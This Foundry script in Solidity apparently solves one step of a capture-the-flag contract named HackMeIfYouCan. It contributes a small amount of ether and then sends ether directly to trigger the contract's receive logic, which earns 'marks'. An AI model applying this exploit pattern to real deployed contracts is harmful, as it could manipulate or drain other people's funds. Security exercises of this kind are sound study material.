// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract ReceiveScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        hackMeIfYouCan = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));

        hackMeIfYouCan.contribute{value: 0.0001 ether}();

        (bool success, ) = address(hackMeIfYouCan).call{value: 0.0001 ether}("");
        require(success, "Ether transfer failed");

        console.log("Marks after sending ether:", hackMeIfYouCan.getMarks(tx.origin));
        vm.stopBroadcast();
    }
}